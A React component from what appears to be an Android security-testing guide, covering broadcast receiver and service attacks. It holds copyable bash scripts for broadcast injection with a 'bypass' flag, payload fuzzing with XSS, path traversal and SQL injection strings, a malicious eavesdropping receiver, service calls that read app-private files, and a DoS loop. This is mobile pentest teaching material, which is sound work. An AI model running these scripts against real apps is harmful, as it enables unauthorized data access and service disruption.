
import React from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Copy, Radio, CheckCircle } from 'lucide-react';

const BroadcastServiceSection: React.FC = () => {
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Radio className="h-5 w-5" />
          Broadcast Receivers & Services Analysis
        </CardTitle>
        <CardDescription>
          Testing broadcast security, service exploitation, and AIDL interface vulnerabilities
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="space-y-4">
          <h3 className="text-lg font-semibold">Broadcast Security Issues</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="border rounded-lg p-4">
              <h4 className="font-semibold text-red-600 mb-2">Broadcast Injection</h4>
              <p className="text-sm text-gray-600 mb-3">
                Sending malicious broadcasts to trigger unintended behavior
              </p>
              <div className="bg-gray-50 p-3 rounded-md">
                <code className="text-xs">
                  {`adb shell am broadcast -a com.app.ACTION_LOGIN \\
  --es "username" "admin" --es "bypass" "true"`}
                </code>
              </div>
            </div>

            <div className="border rounded-lg p-4">
              <h4 className="font-semibold text-orange-600 mb-2">Broadcast Eavesdropping</h4>
              <p className="text-sm text-gray-600 mb-3">
                Intercepting sensitive data from unprotected broadcasts
              </p>
              <div className="bg-gray-50 p-3 rounded-md">
                <code className="text-xs">
                  {`// Malicious receiver
<receiver android:name=".EavesdropReceiver">
  <intent-filter>
    <action android:name="com.app.SENSITIVE_ACTION" />
  </intent-filter>
</receiver>`}
                </code>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <h4 className="font-semibold">Advanced Testing Techniques</h4>
            
            <div className="bg-black text-green-400 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-semibold">Broadcast Fuzzing Framework</span>
                <Button 
                  size="sm" 
                  variant="outline" 
                  onClick={() => copyToClipboard(`#!/bin/bash
# Advanced broadcast fuzzing framework

PACKAGE_NAME="com.example.target"

# Extract all broadcast receivers
echo "Extracting broadcast receivers from $PACKAGE_NAME"
aapt dump xmltree app.apk AndroidManifest.xml | grep -A 20 "receiver" > receivers.txt

# Fuzz broadcast receivers with various payloads
PAYLOADS=(
    "javascript:alert('XSS')"
    "../../../etc/passwd"
    "' OR 1=1--"
    "\\x00\\x01\\x02"
    $(python3 -c "print('A' * 1000)")
)

ACTIONS=(
    "android.intent.action.BOOT_COMPLETED"
    "android.intent.action.USER_PRESENT"
    "com.app.CUSTOM_ACTION"
)

for action in "\${ACTIONS[@]}"; do
    for payload in "\${PAYLOADS[@]}"; do
        echo "Testing action: $action with payload: $payload"
        adb shell am broadcast -a "$action" --es "data" "$payload"
        sleep 1
    done
done`)}
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
              <pre className="text-xs overflow-x-auto">
{`#!/bin/bash
# Advanced broadcast fuzzing framework

PACKAGE_NAME="com.example.target"

# Fuzz broadcast receivers with various payloads
PAYLOADS=(
    "javascript:alert('XSS')"
    "../../../etc/passwd"
    "' OR 1=1--"
)

ACTIONS=(
    "android.intent.action.BOOT_COMPLETED"
    "com.app.CUSTOM_ACTION"
)

for action in "\${ACTIONS[@]}"; do
    for payload in "\${PAYLOADS[@]}"; do
        echo "Testing: $action with $payload"
        adb shell am broadcast -a "$action" --es "data" "$payload"
    done
done`}
              </pre>
            </div>

            <div className="bg-purple-950 text-purple-100 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-semibold">Service Exploitation Script</span>
                <Button 
                  size="sm" 
                  variant="outline" 
                  onClick={() => copyToClipboard(`#!/bin/bash
# Service exploitation and analysis

PACKAGE_NAME="com.example.target"

echo "Analyzing services for $PACKAGE_NAME"

# List all services
adb shell dumpsys activity services | grep "$PACKAGE_NAME"

# Test service binding
adb shell am startservice -n "$PACKAGE_NAME/.VulnerableService" \\
    --es "command" "cat /data/data/$PACKAGE_NAME/sensitive.txt"

# AIDL interface testing
adb shell service call "$PACKAGE_NAME" 1 s16 "malicious_input"

# Service DoS testing
for i in {1..100}; do
    adb shell am startservice -n "$PACKAGE_NAME/.TestService" &
done

echo "Service exploitation tests completed"`)}
                >
                  <Copy className="h-3 w-3" />
                </Button>
              </div>
              <pre className="text-xs overflow-x-auto">
{`#!/bin/bash
# Service exploitation and analysis

PACKAGE_NAME="com.example.target"

echo "Analyzing services for $PACKAGE_NAME"

# Test service binding
adb shell am startservice -n "$PACKAGE_NAME/.VulnerableService" \\
    --es "command" "cat /data/data/$PACKAGE_NAME/sensitive.txt"

# AIDL interface testing
adb shell service call "$PACKAGE_NAME" 1 s16 "malicious_input"

echo "Service exploitation tests completed"`}
              </pre>
            </div>
          </div>

          <Alert>
            <CheckCircle className="h-4 w-4" />
            <AlertDescription>
              <strong>Best Practices for IPC Testing:</strong>
              <br />• Always test with both valid and invalid inputs
              <br />• Check for proper permission enforcement
              <br />• Verify that sensitive data is not exposed through IPC
              <br />• Test component interaction under various system states
            </AlertDescription>
          </Alert>
        </div>
      </CardContent>
    </Card>
  );
};

export default BroadcastServiceSection;
